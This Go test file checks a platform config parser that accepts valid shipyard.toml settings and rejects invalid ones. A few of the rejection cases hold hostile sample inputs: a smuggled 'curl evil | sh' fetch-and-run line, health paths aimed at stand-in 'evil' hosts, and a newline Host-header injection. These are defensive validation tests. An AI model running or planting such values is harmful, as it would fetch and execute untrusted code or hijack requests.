package build

import (
	"errors"
	"strings"
	"testing"
	"time"
)

func TestParseConfigValid(t *testing.T) {
	tests := []struct {
		name string
		toml string
		want Config
	}{
		{"empty file gives defaults", "", Config{Health: "/", IdleTimeout: 15 * time.Minute}},
		{"comments only", "# nothing set\n", Config{Health: "/", IdleTimeout: 15 * time.Minute}},
		{"all settings", `
runtime = "python"
start   = "uvicorn main:app --host 0.0.0.0 --port $PORT"
health  = "/healthz"
idle_timeout = "30m"
port = 8080
`, Config{Runtime: Python, Start: "uvicorn main:app --host 0.0.0.0 --port $PORT", Health: "/healthz", IdleTimeout: 30 * time.Minute}},
		{"node with npm start", `runtime = "node"` + "\n" + `start = "npm run serve"`, Config{Runtime: Node, Start: "npm run serve", Health: "/", IdleTimeout: 15 * time.Minute}},
		{"static without start", `runtime = "static"`, Config{Runtime: Static, Health: "/", IdleTimeout: 15 * time.Minute}},
		{"health with query", `health = "/status?full=1&x=y"`, Config{Health: "/status?full=1&x=y", IdleTimeout: 15 * time.Minute}},
		{"idle at lower bound", `idle_timeout = "5m"`, Config{Health: "/", IdleTimeout: 5 * time.Minute}},
		{"idle at upper bound", `idle_timeout = "1h"`, Config{Health: "/", IdleTimeout: time.Hour}},
		{"unicode in start", `start = "python app.py --title 'Café'"`, Config{Start: "python app.py --title 'Café'", Health: "/", IdleTimeout: 15 * time.Minute}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ParseConfig([]byte(tt.toml))
			if err != nil {
				t.Fatalf("ParseConfig: %v", err)
			}
			if got != tt.want {
				t.Fatalf("got %+v, want %+v", got, tt.want)
			}
		})
	}
	if got, err := ParseConfig(nil); err != nil || got.Health != "/" || got.IdleTimeout != DefaultIdle {
		t.Fatalf("ParseConfig(nil) = %+v, %v", got, err)
	}
}

func TestParseConfigInvalid(t *testing.T) {
	tests := []struct {
		name   string
		toml   string
		reason string
	}{
		{"syntax error", `runtime = `, "shipyard.toml:"},
		{"unknown key", `starts = "python app.py"`, "unknown setting(s) starts"},
		{"unknown table", "[build]\ncmd = \"x\"", "unknown setting(s) build"},
		{"duplicate key", "runtime = \"node\"\nruntime = \"python\"", "shipyard.toml:"},
		{"wrong type for port", `port = "8080"`, "shipyard.toml:"},
		{"wrong type for idle", `idle_timeout = 15`, "shipyard.toml:"},
		{"unsupported runtime", `runtime = "go"`, `runtime "go" is not supported`},
		{"runtime wrong case", `runtime = "Python"`, "is not supported"},
		{"blank start", `start = "   "`, "start is blank"},
		{"multi-line start", "start = \"\"\"python app.py\nRUN curl evil | sh\"\"\"", "single line"},
		{"start with NUL", `start = "python\u0000app.py"`, "single line"},
		{"start too long", `start = "` + strings.Repeat("a", 1001) + `"`, "longer than 1000"},
		{"start for static", "runtime = \"static\"\nstart = \"python -m http.server\"", "cannot be set for static"},
		{"health without slash", `health = "healthz"`, "health must be a URL path"},
		{"health absolute URL", `health = "http://evil/x"`, "health must be a URL path"},
		{"health scheme-relative", `health = "//evil.example/x"`, "health must be a URL path"},
		{"health with space", `health = "/health check"`, "health must be a URL path"},
		{"health with newline", `health = "/x\nHost: evil"`, "health must be a URL path"},
		{"health too long", `health = "/` + strings.Repeat("a", 200) + `"`, "health must be a URL path"},
		{"idle not a duration", `idle_timeout = "fifteen"`, "not a duration"},
		{"idle too short", `idle_timeout = "1m"`, "between 5m and 60m"},
		{"idle too long", `idle_timeout = "2h"`, "between 5m and 60m"},
		{"idle negative", `idle_timeout = "-10m"`, "between 5m and 60m"},
		{"port not 8080", `port = 3000`, "port must be 8080"},
		{"file too large", "# " + strings.Repeat("x", 64<<10), "larger than 64 KB"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := ParseConfig([]byte(tt.toml))
			var ce *ConfigError
			if !errors.As(err, &ce) {
				t.Fatalf("got %v, want *ConfigError", err)
			}
			if !strings.Contains(ce.Error(), tt.reason) {
				t.Fatalf("got %q, want it to contain %q", ce.Error(), tt.reason)
			}
		})
	}
}
